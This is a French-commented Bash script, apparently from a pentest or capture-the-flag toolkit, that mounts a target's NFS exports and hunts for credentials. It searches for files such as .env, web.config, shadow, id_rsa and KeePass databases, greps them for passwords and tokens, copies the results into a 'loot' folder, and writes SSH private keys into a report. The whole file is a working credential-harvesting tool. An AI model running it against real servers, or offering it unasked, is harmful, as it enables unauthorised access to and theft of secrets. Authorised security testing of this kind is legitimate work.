#!/bin/bash
# nfs-hunt.sh — Monter les exports NFS et chasser les credentials
# Usage: ./nfs-hunt.sh <IP>
# Exemple: ./nfs-hunt.sh 10.129.20.33
#
# Ce que ça fait :
#   1. showmount → liste tous les exports
#   2. Monte chaque export
#   3. Cherche web.config, .env, config.php, *.config, id_rsa, etc.
#   4. Grep les credentials dans les fichiers trouvés
#   5. Copie le tout dans ./nfs-loot/
#   6. Output markdown prêt à coller dans 04_External_Recon.md

set -e

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; B='\033[1m'; NC='\033[0m'

if [[ $# -lt 1 ]]; then
    echo -e "${R}Usage: $0 <IP>${NC}"
    exit 1
fi

IP="$1"
MOUNT_BASE="/tmp/nfs-mnt-$$"
LOOT_DIR="./nfs-loot-$(echo "$IP" | tr '.' '-')"
REPORT="$LOOT_DIR/NFS-FINDINGS.md"
TOTAL_CREDS=0

mkdir -p "$LOOT_DIR"

echo -e "${B}${C}"
echo "╔═══════════════════════════════════════╗"
echo "║       nfs-hunt.sh — $IP"
echo "╚═══════════════════════════════════════╝"
echo -e "${NC}"

# ───────────────────────────────────────
# Initialisation du rapport
# ───────────────────────────────────────
{
    echo "# 📁 NFS Hunt — \`$IP\`"
    echo ""
    echo "**Date :** $(date +"%Y-%m-%d %H:%M")"
    echo ""
    echo "---"
    echo ""
} > "$REPORT"

# ───────────────────────────────────────
# 1. Lister les exports
# ───────────────────────────────────────
echo -e "${C}[1] showmount — liste des exports${NC}"
echo '```' >> "$REPORT"
EXPORTS=$(showmount -e "$IP" 2>/dev/null || echo "")
echo "$EXPORTS"
echo "$EXPORTS" >> "$REPORT"
echo '```' >> "$REPORT"
echo "" >> "$REPORT"

if [[ -z "$EXPORTS" ]] || echo "$EXPORTS" | grep -q "Export list for"; then
    # Extraire les paths (ignorer la ligne d'en-tête)
    EXPORT_PATHS=$(echo "$EXPORTS" | tail -n +2 | awk '{print $1}' | grep -v "^$" || true)
else
    EXPORT_PATHS=""
fi

if [[ -z "$EXPORT_PATHS" ]]; then
    echo -e "${Y}[~] Aucun export NFS trouvé${NC}"
    echo "**Résultat : Aucun export disponible**" >> "$REPORT"
    exit 0
fi

echo ""
echo -e "${G}Exports trouvés :${NC}"
echo "$EXPORT_PATHS" | while read -r p; do echo "  → $p"; done
echo ""

# ───────────────────────────────────────
# 2. Monter et analyser chaque export
# ───────────────────────────────────────
while IFS= read -r export_path; do
    [[ -z "$export_path" ]] && continue

    safe_name=$(echo "$export_path" | tr '/' '_' | sed 's/^_//')
    mnt_point="$MOUNT_BASE/$safe_name"
    loot_copy="$LOOT_DIR/$safe_name"

    echo -e "${B}━━━ Export : $export_path ━━━${NC}"
    echo "" >> "$REPORT"
    echo "## Export : \`$export_path\`" >> "$REPORT"
    echo "" >> "$REPORT"

    mkdir -p "$mnt_point" "$loot_copy"

    # Monter
    if sudo mount -t nfs -o nolock,vers=3 "$IP:$export_path" "$mnt_point" 2>/dev/null; then
        echo -e "${G}  [✓] Monté sur $mnt_point${NC}"

        # ── Structure des fichiers
        echo "### Structure" >> "$REPORT"
        echo '```' >> "$REPORT"
        find "$mnt_point" -maxdepth 4 2>/dev/null | head -80 | sed "s|$mnt_point||" >> "$REPORT"
        echo '```' >> "$REPORT"
        echo "" >> "$REPORT"

        # ── Chercher les fichiers sensibles
        echo -e "  ${C}→ Recherche de fichiers sensibles...${NC}"

        SENSITIVE_FILES=$(find "$mnt_point" \( \
            -name "web.config" -o \
            -name "*.config" -o \
            -name ".env" -o \
            -name "*.env" -o \
            -name "config.php" -o \
            -name "wp-config.php" -o \
            -name "settings.py" -o \
            -name "appsettings.json" -o \
            -name "database.yml" -o \
            -name "id_rsa" -o \
            -name "id_ed25519" -o \
            -name "*.pem" -o \
            -name "*.key" -o \
            -name "*.pfx" -o \
            -name "*.kdbx" -o \
            -name "passwd" -o \
            -name "shadow" -o \
            -name "*.sql" -o \
            -name "*.bak" -o \
            -name "*.backup" \
        \) -type f 2>/dev/null || true)

        if [[ -n "$SENSITIVE_FILES" ]]; then
            echo "" >> "$REPORT"
            echo "### ⚠️ Fichiers sensibles trouvés" >> "$REPORT"
            echo '```' >> "$REPORT"
            echo "$SENSITIVE_FILES" | sed "s|$mnt_point||" >> "$REPORT"
            echo '```' >> "$REPORT"
            echo "" >> "$REPORT"

            echo -e "  ${Y}Fichiers sensibles :${NC}"
            echo "$SENSITIVE_FILES" | sed "s|$mnt_point||" | while read -r f; do
                echo -e "    ${R}→${NC} $f"
            done

            # ── Grep credentials dans chaque fichier
            echo "### 🔑 Credentials trouvés" >> "$REPORT"
            echo "" >> "$REPORT"

            while IFS= read -r fpath; do
                [[ -z "$fpath" ]] && continue

                # Copier le fichier
                fname=$(basename "$fpath")
                cp "$fpath" "$loot_copy/${fname}" 2>/dev/null || true

                # Grep credentials
                CREDS=$(grep -iE \
                    "password|passwd|pwd|connectionstring|secret|api.key|token|username|user=" \
                    "$fpath" 2>/dev/null | grep -v "^\s*#\|^\s*//" | head -30 || true)

                if [[ -n "$CREDS" ]]; then
                    ((TOTAL_CREDS++))
                    echo -e "  ${R}[!!!] CREDS dans : $(echo "$fpath" | sed "s|$mnt_point||")${NC}"
                    echo "#### \`$(echo "$fpath" | sed "s|$mnt_point||")\`" >> "$REPORT"
                    echo '```' >> "$REPORT"
                    echo "$CREDS" >> "$REPORT"
                    echo '```' >> "$REPORT"
                    echo "" >> "$REPORT"
                    echo "$CREDS"
                    echo ""
                fi

                # Afficher les clés SSH directement
                if [[ "$fname" == "id_rsa" || "$fname" == "id_ed25519" ]]; then
                    echo -e "  ${R}[!!!] CLÉ SSH TROUVÉE : $fname${NC}"
                    echo "#### SSH Key : \`$fname\`" >> "$REPORT"
                    echo '```' >> "$REPORT"
                    cat "$fpath" >> "$REPORT"
                    echo '```' >> "$REPORT"
                    echo "" >> "$REPORT"
                fi

            done <<< "$SENSITIVE_FILES"
        else
            echo -e "  ${Y}Aucun fichier sensible trouvé directement${NC}"

            # Grep global sur tout le mount
            echo -e "  ${C}→ Grep global credentials...${NC}"
            GLOBAL_CREDS=$(grep -riE \
                "password\s*=|passwd\s*=|pwd\s*=|\"password\"\s*:|connectionString=" \
                "$mnt_point" 2>/dev/null | grep -v ".js:" | head -20 || true)

            if [[ -n "$GLOBAL_CREDS" ]]; then
                echo -e "  ${Y}Credentials potentiels :${NC}"
                echo "### Credentials (grep global)" >> "$REPORT"
                echo '```' >> "$REPORT"
                echo "$GLOBAL_CREDS" | sed "s|$mnt_point||" >> "$REPORT"
                echo '```' >> "$REPORT"
                echo "$GLOBAL_CREDS" | sed "s|$mnt_point||"
            fi
        fi

        # ── Copie globale du loot
        echo -e "  ${C}→ Copie de la structure dans $loot_copy...${NC}"
        cp -r "$mnt_point"/* "$loot_copy/" 2>/dev/null || true

        # Démonter
        sudo umount "$mnt_point" 2>/dev/null || sudo umount -l "$mnt_point" 2>/dev/null || true

    else
        echo -e "  ${R}[✗] Impossible de monter $export_path (permission refusée ou version NFS incompatible)${NC}"
        echo "**Erreur : impossible de monter**" >> "$REPORT"

        # Essayer avec vers=4
        if sudo mount -t nfs -o nolock,vers=4 "$IP:$export_path" "$mnt_point" 2>/dev/null; then
            echo -e "  ${G}[✓] Monté en NFSv4${NC}"
            find "$mnt_point" -maxdepth 4 2>/dev/null | head -50 | sed "s|$mnt_point||" >> "$REPORT"
            sudo umount "$mnt_point" 2>/dev/null || true
        fi
    fi

    rmdir "$mnt_point" 2>/dev/null || true
    echo ""

done <<< "$EXPORT_PATHS"

# Cleanup
rmdir "$MOUNT_BASE" 2>/dev/null || true

# ───────────────────────────────────────
# Résumé final
# ───────────────────────────────────────
{
    echo ""
    echo "---"
    echo ""
    echo "## 📊 Résumé"
    echo ""
    echo "| Stat | Valeur |"
    echo "|---|---|"
    echo "| Exports testés | $(echo "$EXPORT_PATHS" | wc -l) |"
    echo "| Fichiers avec creds | $TOTAL_CREDS |"
    echo "| Loot copié dans | \`$LOOT_DIR/\` |"
    echo ""
    echo "> **Coller dans** : \`04_External_Recon.md\` → Section NFS"
} >> "$REPORT"

echo -e "${B}${G}╔═══════════════════════════════════════╗${NC}"
if [[ $TOTAL_CREDS -gt 0 ]]; then
    echo -e "${B}${R}║  $TOTAL_CREDS FICHIER(S) AVEC CREDENTIALS TROUVÉS${NC}"
else
    echo -e "${B}${G}║              NFS HUNT TERMINÉ              ${NC}"
fi
echo -e "${B}${G}╚═══════════════════════════════════════╝${NC}"
echo ""
echo -e "  Rapport  : ${B}$REPORT${NC}"
echo -e "  Loot     : ${B}$LOOT_DIR/${NC}"
echo ""
[[ $TOTAL_CREDS -gt 0 ]] && echo -e "${R}[!!!] Credentials trouvés → reporter dans 03_LOOT.md IMMÉDIATEMENT${NC}"
